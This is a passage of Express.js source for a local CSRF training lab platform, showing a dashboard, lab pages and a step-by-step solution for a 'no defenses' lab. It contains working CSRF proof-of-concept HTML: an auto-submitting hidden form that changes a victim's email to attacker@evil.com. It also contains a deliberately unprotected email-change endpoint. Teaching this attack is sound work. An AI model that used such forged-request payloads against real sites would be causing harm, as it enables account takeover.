            .info-box { padding:15px;border-left:5px solid #ff6600;background:#fef9f0;border-radius:0 4px 4px 0;margin-bottom:20px;font-size:14px; }
            .account-card { background:#f8f9fa;border:1px solid #dee2e6;border-radius:8px;padding:20px;margin-bottom:20px; }
            .account-card label { font-weight:bold;color:#555;display:block;margin-bottom:6px;font-size:13px; }
            .account-card input[type=email] { width:calc(100% - 24px);padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:12px; }
            .account-card input[type=hidden] {}
            .btn { padding:10px 22px;background:#ff6600;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold;font-size:14px; }
            .btn:hover { background:#e55c00; }
            .token-inspector { margin-top:20px;padding:15px;background:#282c34;border-radius:6px;font-family:monospace;font-size:12px;color:#abb2bf; }
            .token-inspector .key { color:#61afef; }
            .token-inspector .val { color:#98c379; }
            code { background:#eee;padding:2px 5px;border-radius:3px;font-family:monospace;font-size:13px; }
            pre { background:#f4f4f4;padding:10px;border-radius:4px;overflow-x:auto;font-size:13px; }
        </style>
    </head>
    <body>
        <div class="nav-bar"><span>${lab.name}</span></div>
        <div class="top-links">
            <a href="/" style="color:#ff6600;font-weight:bold;text-decoration:none;font-size:18px;">🏠 Home</a>
            <div style="height:20px;border-left:1px solid #ccc;"></div>
            <a href="/exploit-editor" style="background:#ff6600;color:white;padding:8px 18px;text-decoration:none;font-weight:bold;border-radius:3px;font-size:13px;">Go to Exploit Server</a>
        </div>

        <div class="split-container">
            <div class="lab-panel">
                <h2>${lab.name}</h2>
                <div class="info-box">${lab.intro}</div>

                <h3 style="border-bottom:2px solid #eee;padding-bottom:8px;">My Account</h3>
                <div class="account-card">
                    <p style="margin-top:0;color:#555;">Current email: <strong style="color:#232f3e;">${state.email}</strong></p>
                    ${extraPanelHtml}
                </div>

                 <div class="token-inspector">
                    <div style="color:#c678dd;font-weight:bold;margin-bottom:8px;">🔑 Token Inspector</div>
                    <div><span class="key">Session cookie: </span><span class="val">${VICTIM_SESSION}</span></div>
                    ${labId === 4 ? `<div><span class="key">Attacker token (pool): </span><span class="val">${ATTACKER_CSRF_TOKEN}</span></div>` : ''}
                    ${[1,2,3,6].includes(labId) ? `<div><span class="key">Victim CSRF token: </span><span class="val">${VICTIM_CSRF_TOKEN}</span></div>` : ''}
                    ${labId === 5 ? `<div><span class="key">Cookie SameSite: </span><span class="val">Lax</span></div>` : ''}
                    ${labId === 6 ? `<div><span class="key">Referer check: </span><span class="val">enabled (skipped when absent)</span></div>` : ''}
                    ${labId === 7 ? `<div><span class="key">Cookie SameSite: </span><span class="val">Default (Lax enforced by browser)</span></div>` : ''}
                    ${labId === 8 ? `<div><span class="key">csrfKey cookie: </span><span class="val">${req.cookies.csrfKey || VICTIM_CSRF_KEY}</span></div>
                    <div><span class="key">Victim CSRF token: </span><span class="val">${VICTIM_CSRF_TOKEN8}</span></div>` : ''}
                    ${labId === 9 ? `<div><span class="key">csrf cookie: </span><span class="val">${req.cookies.csrf || LAB9_CSRF_VALUE}</span></div>` : ''}
                </div>

                <h3 style="border-bottom:2px solid #eee;padding-bottom:8px;margin-top:25px;">Request Inspector</h3>
                ${requestInspector}

                <!-- ── Generate CSRF PoC ── -->
                <div style="margin-top:25px;border:1px solid #dee2e6;border-radius:8px;overflow:hidden;">
                    <div style="background:#232f3e;color:white;padding:11px 18px;display:flex;align-items:center;justify-content:space-between;">
                        <span style="font-weight:bold;font-size:13px;">🔧 Generate CSRF PoC &nbsp;<span style="font-size:11px;opacity:.7;font-weight:normal;">— like Burp Suite Professional</span></span>
                        <button onclick="togglePoC()" id="poc-toggle-btn"
                            style="background:#ff6600;color:white;border:none;padding:6px 16px;border-radius:4px;cursor:pointer;font-weight:bold;font-size:12px;">
                            Generate PoC ▼
                        </button>
                    </div>

                    <!-- Raw HTTP request -->
                    <div style="background:#1a1a2e;color:#a6e3a1;font-family:Consolas,monospace;font-size:12px;padding:14px 16px;white-space:pre;border-bottom:1px solid #333;">${pocData[labId].rawRequest.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>

                    <!-- PoC Output (hidden until button clicked) -->
                    <div id="poc-output" style="display:none;padding:16px;background:#f9f9f9;">
                        <label style="font-size:12px;font-weight:bold;color:#555;display:block;margin-bottom:6px;">Generated PoC HTML:</label>
                        <textarea id="poc-code" readonly
                            style="width:100%;height:200px;font-family:Consolas,monospace;font-size:12px;border:1px solid #ccc;border-radius:4px;padding:10px;background:#282c34;color:#abb2bf;resize:vertical;"
                        >${pocData[labId].poc.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</textarea>
                        <div style="display:flex;gap:10px;margin-top:10px;">
                            <button onclick="copyPoC()" style="background:#28a745;color:white;border:none;padding:8px 18px;border-radius:4px;cursor:pointer;font-weight:bold;font-size:13px;">📋 Copy to Clipboard</button>
                            <button onclick="sendToExploit()" style="background:#ff6600;color:white;border:none;padding:8px 18px;border-radius:4px;cursor:pointer;font-weight:bold;font-size:13px;">⚡ Send to Exploit Server</button>
                        </div>
                        <p style="font-size:11px;color:#888;margin-top:8px;">Click <strong>Send to Exploit Server</strong> → then click <strong>Deliver exploit to victim</strong> on the exploit server page.</p>
                    </div>
                </div>

                <div style="margin-top:15px;">
                    <a href="/lab/${labId}/reset" style="background:#6c757d;color:white;text-decoration:none;padding:8px 16px;border-radius:4px;font-size:13px;font-weight:bold;">🔄 Reset Lab</a>
                </div>
            </div>

            <div class="solution-sidebar">
                ${state.solved ? '<div style="background:#28a745;color:white;padding:12px 16px;border-radius:6px;font-weight:bold;font-size:15px;margin-bottom:20px;text-align:center;">🎉 Lab Solved!</div>' : ''}
                ${lab.full_description}
            </div>
        </div>
    </body>
    <script>
    function togglePoC() {
        const out = document.getElementById('poc-output');
        const btn = document.getElementById('poc-toggle-btn');
        const visible = out.style.display !== 'none';
        out.style.display = visible ? 'none' : 'block';
        btn.textContent = visible ? 'Generate PoC ▼' : 'Hide PoC ▲';
    }
    function copyPoC() {
        const ta = document.getElementById('poc-code');
        ta.select();
        document.execCommand('copy');
        alert('PoC copied to clipboard!');
    }
    async function sendToExploit() {
        const raw = document.getElementById('poc-code').value
            .replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>');
        await fetch('/exploit/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'payload=' + encodeURIComponent(raw)
        });
        window.open('/exploit-editor', '_blank');
    }
    // Sync email input → PoC textarea in real-time
    (function() {
        const emailInput = document.getElementById('lab-email-input');
        if (!emailInput) return;
        emailInput.addEventListener('input', sync);
        emailInput.addEventListener('change', sync);
        function sync() {
            const ta = document.getElementById('poc-code');
            if (!ta) return;
            const email = emailInput.value.trim() || 'attacker@evil.com';
            if (!ta.dataset.orig) ta.dataset.orig = ta.value;
            ta.value = ta.dataset.orig.replace(/value="attacker@evil\.com"/g, 'value="' + email + '"');
        }
    })();
    </script>
    </html>
    `;
}

// ─── State API (for live polling) ───────────────────────────────────────────

app.get('/api/lab/:id', (req, res) => {
    const id = parseInt(req.params.id);
    if (labState[id]) {
        res.json(labState[id]);
    } else {
        res.status(404).json({});
    }
});

// ─── Universal Lab Reset ─────────────────────────────────────────────────────

app.get('/lab/:id/reset', (req, res) => {
    const id = parseInt(req.params.id);
    if (labState[id]) {
        labState[id].email = 'wiener@normal-user.net';
        labState[id].lastRequest = null;
        labState[id].solved = false;
    }
    const urls = {1:'/lab/no-defenses',2:'/lab/token-method',3:'/lab/token-present',4:'/lab/token-session',5:'/lab/samesite-lax',6:'/lab/referer-bypass',7:'/lab/method-override',8:'/lab/csrf-cookie',9:'/lab/csrf-double'};
    res.redirect(urls[id] || '/');
});

// ─── Lab Description Route ──────────────────────────────────────────────────

app.get('/lab/:id/description', (req, res) => {
    const lab = labs.find(l => l.id == req.params.id);
    if (!lab) return res.redirect('/');
    res.send(`
    <!DOCTYPE html><html><head><title>Description: ${lab.name}</title>
    <style>
        body { font-family:'Segoe UI',sans-serif;margin:0;background:#f4f7f9; }
        .header { background:#232f3e;color:white;padding:20px;border-bottom:4px solid #ff6600;display:flex;justify-content:space-between;align-items:center; }
        .container { max-width:800px;margin:40px auto;background:white;padding:40px;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,0.1); }
        .btn { padding:10px 20px;background:#ff6600;color:white;text-decoration:none;border-radius:4px;font-weight:bold; }
        code { background:#eee;padding:2px 5px;border-radius:3px;font-family:monospace; }
        pre { background:#282c34;color:#abb2bf;padding:15px;border-radius:6px;overflow-x:auto;font-size:13px; }
    </style></head><body>
    <div class="header">
        <h1 style="color:white;margin:0;font-size:22px;">Lab Description</h1>
        <a href="${lab.url}" class="btn">Back to Lab</a>
    </div>
    <div class="container">
        ${lab.full_description}
        <hr>
        <a href="/" style="color:#666;">← Back to Dashboard</a>
    </div>
    </body></html>
    `);
});

// ─── Dashboard ──────────────────────────────────────────────────────────────

app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>CSRF Master - Learning Platform</title>
        <style>
            :root { --primary: #ff6600; --bg: #f4f7f9; --card-bg: #ffffff; --text: #333; }
            body { font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;margin:0;background:var(--bg);color:var(--text); }
            .navbar { background:#1a252f;padding:15px 50px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:1000; }
            .navbar .logo { color:var(--primary);font-weight:bold;font-size:20px;text-decoration:none; }
            .navbar .nav-links a { color:white;text-decoration:none;margin-left:20px;font-size:14px;font-weight:500; }
            .navbar .nav-links a:hover { color:var(--primary); }
            .hero { background:#232f3e;color:white;padding:60px 20px;text-align:center;border-bottom:5px solid var(--primary); }
            .hero h1 { margin:0;font-size:42px;letter-spacing:1px; }
            .hero p { opacity:0.8;font-size:18px;margin-top:10px; }
            .dashboard { max-width:1200px;margin:40px auto;padding:0 20px; }
            .section-title { font-size:24px;margin-bottom:30px;border-bottom:2px solid #ddd;padding-bottom:10px;display:flex;align-items:center;gap:10px; }
            .lab-grid { display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:25px; }
            .lab-card { background:var(--card-bg);border-radius:8px;overflow:hidden;box-shadow:0 4px 15px rgba(0,0,0,0.05);transition:transform 0.3s,box-shadow 0.3s;border:1px solid #eee;display:flex;flex-direction:column; }
            .lab-card:hover { transform:translateY(-5px);box-shadow:0 10px 25px rgba(0,0,0,0.1); }
            .lab-header { padding:20px;border-bottom:1px solid #eee; }
            .lab-status { display:flex;justify-content:space-between;align-items:center;margin-bottom:10px; }
            .badge { padding:4px 8px;border-radius:4px;font-size:11px;font-weight:bold; }
            .badge-apprentice { background:#e8f5e9;color:#28a745; }
            .badge-practitioner { background:#fffde7;color:#856404; }
            .lab-body { padding:20px;flex-grow:1; }
            .lab-body h3 { margin:0 0 10px 0;font-size:18px;color:#232f3e; }
            .lab-body p { font-size:14px;color:#666;line-height:1.5;margin-bottom:15px; }
            .lab-footer { padding:15px 20px;background:#fafafa;border-top:1px solid #eee;display:flex;gap:10px; }
            .btn { padding:8px 16px;border-radius:4px;text-decoration:none;font-size:13px;font-weight:bold;text-align:center;flex:1;transition:opacity 0.2s;cursor:pointer;border:none; }
            .btn:hover { opacity:0.9; }
            .btn-primary { background:var(--primary);color:white; }
            .btn-outline { border:1px solid #ddd;color:#555;background:white; }
            .lab-details { display:none;padding:15px;background:#fff8e1;border-top:1px solid #ffe082;font-size:13px; }
            .lab-details.active { display:block;animation:fadeIn 0.3s; }
            @keyframes fadeIn { from{opacity:0} to{opacity:1} }
            code { background:#eee;padding:2px 4px;border-radius:3px;font-family:monospace; }
        </style>
        <script>
            function toggleDetails(id) {
                const el = document.getElementById('details-' + id);
                el.classList.toggle('active');
            }
        </script>
    </head>
    <body>
        <div class="navbar">
            <a href="/" class="logo">CSRF MASTER</a>
            <div class="nav-links">
                <a href="/">All Labs</a>
                <a href="/exploit-editor">Exploit Server</a>
                <a href="/notes">Notes</a>
            </div>
        </div>
        <div class="hero">
            <h1>Cross-Site Request Forgery (CSRF)</h1>
            <p>Learn to forge cross-site requests and bypass every major CSRF defense.</p>
        </div>
        <div class="dashboard">
            <div class="section-title">🔐 Learning Path</div>
            <div class="lab-grid">
                ${labs.map(lab => `
                <div class="lab-card">
                    <div class="lab-header">
                        <div class="lab-status">
                            <span class="badge badge-${lab.difficultyClass}">${lab.difficulty}</span>
                            <span style="font-size:12px;color:#999;">#${lab.id}</span>
                        </div>
                        <a href="${lab.url}" style="color:#232f3e;text-decoration:none;"><h3 style="margin:0;font-size:18px;">${lab.name}</h3></a>
                    </div>
                    <div class="lab-body">
                        <p>${lab.description}</p>
                        <div style="font-size:13px;color:#444;"><strong>Learning:</strong> ${lab.learning}</div>
                    </div>
                    <div id="details-${lab.id}" class="lab-details">
                        <strong>Quick Intro:</strong> ${lab.intro}<br><br>
                        <strong>Key Payload:</strong> <code style="word-break:break-all;">${lab.payload.substring(0,80).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}...</code><br><br>
                        <strong>Solution:</strong> ${lab.solution}
                    </div>
                    <div class="lab-footer">
                        <a href="${lab.url}" class="btn btn-primary">Access Lab</a>
                        <button onclick="toggleDetails(${lab.id})" class="btn btn-outline">Hints & Solution</button>
                    </div>
                </div>
                `).join('')}
            </div>
        </div>
    </body>
    </html>
    `);
});

// ─── Lab 1: No Defenses — intro/status page ─────────────────────────────────

app.get('/lab/no-defenses', (req, res) => {
    const state  = labState[1];
    const solved = state.solved;
    const lr     = state.lastRequest;

    const reqInspectorHtml = lr ? `
        <div style="background:#1e1e2e;color:#cdd6f4;border-radius:6px;overflow:hidden;font-family:monospace;font-size:12px;">
            <div style="background:#181825;padding:8px 14px;color:#cba6f7;font-weight:bold;display:flex;align-items:center;gap:10px;">
                Last Received Request
                <span style="background:${lr.success ? '#a6e3a1' : '#f38ba8'};color:#1e1e2e;padding:2px 8px;border-radius:3px;font-size:11px;">${lr.success ? '200 OK' : '403 FORBIDDEN'}</span>
                ${lr.fromExploit ? '<span style="background:#fab387;color:#1e1e2e;padding:2px 8px;border-radius:3px;font-size:11px;">⚠️ CSRF DETECTED</span>' : ''}
            </div>
            <div style="padding:14px;line-height:2;">
                <div><span style="color:#89b4fa;">Method:</span>      ${lr.method}</div>
                <div><span style="color:#89b4fa;">Referer:</span>     ${lr.referer || '<em style="color:#6c7086">not sent</em>'}</div>
                <div><span style="color:#89b4fa;">CSRF Token:</span>  ${lr.csrfToken || '<em style="color:#6c7086">not present</em>'}</div>
                <div><span style="color:#89b4fa;">Email param:</span> ${lr.email}</div>
                <div><span style="color:#89b4fa;">Result:</span>      <span style="color:${lr.fromExploit ? '#a6e3a1' : '#fab387'}">${lr.message}</span></div>
            </div>
        </div>` :
        `<div style="padding:18px;text-align:center;color:#888;font-size:13px;background:#f9f9f9;border:1px dashed #ccc;border-radius:6px;">
            No requests yet. Deliver an exploit from the exploit server, then check here.
        </div>`;

    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Lab: CSRF vulnerability with no defenses</title>
<style>
*{box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;margin:0;background:#f4f7f9;color:#333}
a{text-decoration:none}
.navbar{background:#1a252f;padding:12px 30px;display:flex;justify-content:space-between;align-items:center}
.navbar .logo{color:#ff6600;font-weight:bold;font-size:18px}
.navbar a{color:white;margin-left:18px;font-size:13px}
.navbar a:hover{color:#ff6600}
.lab-bar{background:#232f3e;padding:11px 30px;display:flex;align-items:center;gap:14px;border-bottom:3px solid #ff6600}
.badge-ap{background:#e8f5e9;color:#28a745;padding:3px 10px;border-radius:4px;font-size:11px;font-weight:bold}
.lab-bar-title{color:white;font-size:15px;font-weight:bold;flex:1}
.status-pill{padding:4px 12px;border-radius:4px;font-size:12px;font-weight:bold}
.status-unsolved{background:#555;color:#ddd}
.status-solved{background:#28a745;color:white;display:none}
.solved-banner{display:none;background:linear-gradient(135deg,#28a745,#20c997);color:white;padding:18px 30px;text-align:center;font-size:20px;font-weight:bold;letter-spacing:.5px}
.page{display:flex;max-width:1500px;margin:22px auto;gap:24px;padding:0 22px;align-items:flex-start}
.main{flex:1;display:flex;flex-direction:column;gap:20px}
.sidebar{width:430px;background:white;border-radius:8px;padding:24px;box-shadow:0 4px 15px rgba(0,0,0,.1);position:sticky;top:18px;max-height:91vh;overflow-y:auto}
.card{background:white;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.07);overflow:hidden}
.card-head{background:#232f3e;color:white;padding:11px 18px;font-weight:bold;font-size:13px;display:flex;align-items:center;gap:8px}
.card-body{padding:22px}
/* fake app */
.app-top{background:#222;color:white;padding:10px 18px;display:flex;justify-content:space-between;align-items:center}
.app-top .brand{font-weight:bold;font-size:15px}
.app-top a{color:#aaa;margin-left:14px;font-size:13px}
.app-top a.active{color:#ff6600;font-weight:bold}
.app-body{padding:24px}
.app-body h2{margin-top:0;padding-bottom:10px;border-bottom:1px solid #eee;color:#232f3e}
.row{display:flex;align-items:center;gap:14px;margin-bottom:14px}
.lbl{width:95px;color:#666;font-size:13px;font-weight:bold}
.email-tag{background:#e8f5e9;border:1px solid #a8d5a2;padding:5px 13px;border-radius:4px;font-family:monospace;font-size:13px;transition:background .4s}
.email-tag.changed{background:#fff3cd;border-color:#ffc107}
.upd-form{display:flex;align-items:center;gap:8px;margin-top:4px}
.upd-form input{padding:9px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;width:270px}
.upd-form button{padding:9px 20px;background:#ff6600;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold;font-size:13px}
.upd-form button:hover{background:#e55c00}
.warn-note{font-size:11px;color:#e53935;margin-top:8px}
/* conditions */
.cond{display:flex;gap:12px;padding:13px;border-radius:6px;margin-bottom:10px;border:1px solid #c3e6cb;background:#e8f5e9}
.cond-ico{font-size:20px;flex-shrink:0;margin-top:1px}
.cond-title{font-weight:bold;color:#155724;font-size:13px;margin-bottom:4px}
.cond-detail{font-size:12px;color:#555;line-height:1.6}
code{background:#f0f0f0;padding:2px 5px;border-radius:3px;font-family:monospace;font-size:12px;color:#c0392b}
.http-box{background:#282c34;color:#abb2bf;border-radius:6px;padding:14px;font-family:Consolas,monospace;font-size:12px;line-height:1.8}
/* sidebar */
.sidebar h2{color:#ff6600;margin-top:0;font-size:18px}
.sidebar h3{color:#37475a;font-size:14px;margin-top:20px;border-top:1px solid #eee;padding-top:14px}
.sidebar ol li{margin-bottom:10px;line-height:1.65;font-size:13px}
.sidebar pre{background:#282c34;color:#abb2bf;padding:12px;border-radius:6px;font-size:11px;overflow-x:auto;line-height:1.6;margin:8px 0}
.info-pill{background:#e7f3ff;border:1px solid #b8daff;padding:11px 14px;border-radius:4px;font-size:13px;margin:12px 0}
.verdict{margin-top:14px;padding:12px;background:#fff3cd;border-left:4px solid #ff9800;border-radius:4px;font-size:13px}
.btn-reset{background:#6c757d;color:white;border:none;padding:7px 14px;border-radius:4px;cursor:pointer;font-size:12px}
.btn-reset:hover{background:#5a6268}
</style>
</head>
<body>

<div class="navbar">
    <a href="/" class="logo">CSRF MASTER</a>
    <div>
        <a href="/">All Labs</a>
        <a href="/exploit-editor">Exploit Server</a>
        <a href="/notes">Notes</a>
    </div>
</div>

<div class="lab-bar">
    <span class="badge-ap">APPRENTICE</span>
    <span class="lab-bar-title">CSRF vulnerability with no defenses</span>
    <span class="status-pill status-unsolved" id="badge-unsolved">Not Solved</span>
    <span class="status-pill status-solved"  id="badge-solved">✅ Solved</span>
</div>

<div style="background:#fff;border-bottom:1px solid #dee2e6;padding:14px 30px;display:flex;gap:12px;align-items:center;">
    <a href="/my-account" target="_blank"
       style="background:#ff6600;color:white;padding:10px 22px;border-radius:5px;font-weight:bold;font-size:14px;text-decoration:none;">
        🌐 ACCESS THE LAB
    </a>
    <a href="/exploit-editor"
       style="background:#232f3e;color:white;padding:10px 22px;border-radius:5px;font-weight:bold;font-size:14px;text-decoration:none;">
        ⚡ GO TO EXPLOIT SERVER
    </a>
    <span style="font-size:13px;color:#888;margin-left:8px;">
        Vulnerable website: <code style="background:#f0f0f0;padding:2px 6px;border-radius:3px;font-size:12px;">http://localhost:3000/my-account</code>
    </span>
</div>

<div class="solved-banner" id="solved-banner">
    🎉 Congratulations! Lab Solved — email changed via CSRF attack!
</div>

<div class="page">
  <div class="main">

    <!-- ── Simulated Vulnerable App ── -->
    <div class="card">
        <div class="card-head">🌐 Vulnerable Web Application</div>
        <div class="app-top">
            <span class="brand">wiener's Blog</span>
            <div><a href="#">Home</a><a href="#" class="active">My Account</a></div>
        </div>
        <div class="app-body">
            <h2>My Account</h2>
            <div class="row"><span class="lbl">Username</span><span>wiener</span></div>
            <div class="row">
                <span class="lbl">Email</span>
                <span class="email-tag" id="email-display">${state.email}</span>
            </div>
            <hr style="border:none;border-top:1px solid #eee;margin:16px 0">
            <p style="font-size:13px;color:#555;margin-bottom:10px;">Change your email address:</p>
            <form action="/email/change/1" method="POST" class="upd-form">
                <input type="email" name="email" placeholder="new@example.com" required>
                <button type="submit">Update Email</button>
            </form>
            <p class="warn-note">⚠️ No CSRF token on this form — this is the vulnerability.</p>
        </div>
    </div>

    <!-- ── CSRF Vulnerability Analysis ── -->
    <div class="card">
        <div class="card-head">🔍 CSRF Vulnerability Analysis — All 3 Conditions Met?</div>
        <div class="card-body">

            <div class="cond">
                <div class="cond-ico">✅</div>
                <div>
                    <div class="cond-title">Condition 1 — Relevant Action (SATISFIED)</div>
                    <div class="cond-detail">
                        <strong>Email change functionality</strong> — highly relevant.<br>
                        If the attacker changes the email to one they control → they trigger a password reset → <strong>full account takeover</strong>.
                    </div>
                </div>
            </div>

            <div class="cond">
                <div class="cond-ico">✅</div>
                <div>
                    <div class="cond-title">Condition 2 — Cookie-Based Session Handling (SATISFIED)</div>
                    <div class="cond-detail">
                        The app tracks sessions <strong>only via a session cookie</strong>. No additional token per request.<br>
                        <code>Cookie: session=victim_session_abc123</code><br>
                        The browser attaches this cookie <strong>automatically</strong> on every request — even cross-site ones.
                    </div>
                </div>
            </div>

            <div class="cond">
                <div class="cond-ico">✅</div>
                <div>
                    <div class="cond-title">Condition 3 — No Unpredictable Request Parameters (SATISFIED)</div>
                    <div class="cond-detail">
                        The only parameter is: <code>email=new@address.com</code><br>
                        The attacker <strong>chooses this value</strong> — nothing is random or secret.<br>
                        If there were a CSRF token the attacker couldn't predict, this would not be exploitable.
                    </div>
                </div>
            </div>

            <div class="verdict">
                <strong>⚠️ Verdict: All 3 conditions satisfied → This endpoint is VULNERABLE to CSRF</strong>
            </div>

            <h3 style="margin-top:20px;font-size:13px;color:#37475a;border-top:1px solid #eee;padding-top:14px;">
                The Raw HTTP Request (intercepted in Burp Suite)
            </h3>
            <div class="http-box">
<span style="color:#c678dd;font-weight:bold">POST</span> <span style="color:#e06c75">/email/change</span> HTTP/1.1<br>
<span style="color:#61afef">Host:</span>           <span style="color:#98c379">vulnerable-website.com</span><br>
<span style="color:#61afef">Content-Type:</span>   <span style="color:#98c379">application/x-www-form-urlencoded</span><br>
<span style="color:#61afef">Content-Length:</span> <span style="color:#98c379">30</span><br>
<span style="color:#61afef">Cookie:</span>         <span style="color:#d19a66">session=victim_session_abc123</span>
<br>
<span style="color:#98c379">email=wiener@normal-user.com</span>
            </div>
        </div>
    </div>

    <!-- ── Request Inspector ── -->
    <div class="card">
        <div class="card-head">📡 Request Inspector — Last Request Received by Server</div>
        <div class="card-body" id="req-inspector">${reqInspectorHtml}</div>
    </div>

    <!-- ── Generate CSRF PoC ── -->
    <div style="margin-top:22px;border:1px solid #dee2e6;border-radius:8px;overflow:hidden;">
        <div style="background:#232f3e;color:white;padding:11px 18px;display:flex;align-items:center;justify-content:space-between;">
            <span style="font-weight:bold;font-size:13px;">🔧 Generate CSRF PoC &nbsp;<span style="font-size:11px;opacity:.7;font-weight:normal;">— like Burp Suite Professional</span></span>
            <button onclick="togglePoC()" id="poc-toggle-btn"
                style="background:#ff6600;color:white;border:none;padding:6px 16px;border-radius:4px;cursor:pointer;font-weight:bold;font-size:12px;">
                Generate PoC ▼
            </button>
        </div>
        <div style="background:#1a1a2e;color:#a6e3a1;font-family:Consolas,monospace;font-size:12px;padding:14px 16px;white-space:pre;border-bottom:1px solid #333;">POST /email/change/1 HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=victim_session_abc123

email=wiener@normal-user.net</div>
        <div id="poc-output" style="display:none;padding:16px;background:#f9f9f9;">
            <label style="font-size:12px;font-weight:bold;color:#555;display:block;margin-bottom:6px;">Generated PoC HTML:</label>
            <textarea id="poc-code" readonly
                style="width:100%;height:190px;font-family:Consolas,monospace;font-size:12px;border:1px solid #ccc;border-radius:4px;padding:10px;background:#282c34;color:#abb2bf;resize:vertical;box-sizing:border-box;"
>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by CSRF Master --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="http://localhost:3000/email/change/1" method="POST"&gt;
      &lt;input type="hidden" name="email" value="attacker@evil.com" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</textarea>
            <div style="display:flex;gap:10px;margin-top:10px;">
                <button onclick="copyPoC()" style="background:#28a745;color:white;border:none;padding:8px 18px;border-radius:4px;cursor:pointer;font-weight:bold;font-size:13px;">📋 Copy to Clipboard</button>
                <button onclick="sendToExploit()" style="background:#ff6600;color:white;border:none;padding:8px 18px;border-radius:4px;cursor:pointer;font-weight:bold;font-size:13px;">⚡ Send to Exploit Server</button>
            </div>
            <p style="font-size:11px;color:#888;margin-top:8px;">Click <strong>Send to Exploit Server</strong> → then click <strong>Deliver exploit to victim</strong> on the exploit server page.</p>
        </div>
    </div>

    <div style="margin-top:14px;">
        <a href="/lab/1/reset"><button class="btn-reset">🔄 Reset Lab</button></a>
        <span style="font-size:12px;color:#888;margin-left:10px;">Resets email and solved status back to default.</span>
    </div>
    <script>
    function togglePoC() {
        const out = document.getElementById('poc-output');
        const btn = document.getElementById('poc-toggle-btn');
        const vis = out.style.display !== 'none';
        out.style.display = vis ? 'none' : 'block';
        btn.textContent = vis ? 'Generate PoC ▼' : 'Hide PoC ▲';
    }
    function copyPoC() {
        const ta = document.getElementById('poc-code');
        // decode HTML entities before copying
        const txt = ta.value.replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
        navigator.clipboard ? navigator.clipboard.writeText(txt) : (ta.select(), document.execCommand('copy'));
        alert('PoC copied to clipboard!');
    }
    async function sendToExploit() {
        const raw = document.getElementById('poc-code').value
            .replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
        await fetch('/exploit/save', {
            method: 'POST',
            headers: {'Content-Type':'application/x-www-form-urlencoded'},
            body: 'payload=' + encodeURIComponent(raw)
        });
        window.open('/exploit-editor', '_blank');
    }
    </script>

  </div><!-- /main -->

  <!-- ── Sidebar ── -->
  <div class="sidebar">
    <h2>CSRF with No Defenses</h2>
    <span class="badge-ap">APPRENTICE</span>
    <p style="margin-top:12px;font-size:13px;color:#555;line-height:1.6;">
        This lab's email change functionality is vulnerable to CSRF.
        To solve the lab, craft HTML that uses a CSRF attack to change the viewer's email address and upload it to the exploit server.
    </p>

    <div class="info-pill">
        <strong>Credentials:</strong> wiener / peter<br>
        <strong>Goal:</strong> Change victim's email to <code>attacker@evil.com</code>
    </div>

    <h3>Step-by-Step Solution</h3>
    <ol>
        <li>
            <strong>Identify the vulnerability:</strong> Look at the email change form —
            it POSTs to <code>/email/change/1</code> with only an <code>email</code> parameter.
            No CSRF token is present.
        </li>
        <li>
            <strong>Go to the Exploit Server:</strong>
            Click <a href="/exploit-editor" style="color:#ff6600;font-weight:bold">Exploit Server</a>
            and select the <strong>"Lab 1 — Basic POST"</strong> template button.
        </li>
        <li>
            <strong>The exploit HTML:</strong>
            <pre>&lt;html&gt;
  &lt;body&gt;
    &lt;form action="http://localhost:3000
          /email/change/1"
          method="POST"&gt;
      &lt;input type="hidden"
             name="email"
             value="attacker@evil.com"&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
        </li>
        <li>
            <strong>Click Store</strong> to save the exploit to <code>/exploit</code>.
        </li>
        <li>
            <strong>Click "Deliver exploit to victim"</strong> — the victim's browser opens
            <code>/exploit</code>, the form fires automatically, the victim's session cookie
            is attached, and the email is changed.
        </li>
        <li>
            <strong>Come back here</strong> — the email display updates live and the
            <span style="background:#28a745;color:white;padding:1px 6px;border-radius:3px;font-size:11px;">✅ Solved</span>
            badge appears automatically.
        </li>
    </ol>

    <h3>Why It Works</h3>
    <p style="font-size:13px;color:#555;line-height:1.65;">
        The server has no CSRF token. When the victim loads the exploit page, the browser
        fires a POST to <code>/email/change/1</code> and automatically includes the
        victim's session cookie. The server sees a valid session and processes the change —
        with no way to know the request was forged from another site.
    </p>

    <hr style="border:none;border-top:1px solid #eee;margin:16px 0">
    <a href="/" style="color:#666;font-size:13px;">← Back to Dashboard</a>
  </div>
</div>

<script>
const initEmail = ${JSON.stringify(state.email)};
const initSolved = ${state.solved};

function applyState(data) {
    // Email display
    const el = document.getElementById('email-display');
    if (el && el.textContent !== data.email) {
        el.textContent = data.email;
        el.classList.add('changed');
